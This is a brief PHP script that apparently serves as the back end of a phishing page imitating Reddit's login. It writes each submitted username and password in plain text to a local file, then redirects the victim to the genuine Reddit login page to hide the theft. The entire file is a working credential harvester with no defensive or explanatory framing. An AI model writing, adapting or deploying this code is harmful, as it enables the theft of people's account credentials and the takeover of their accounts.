<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F');
exit();
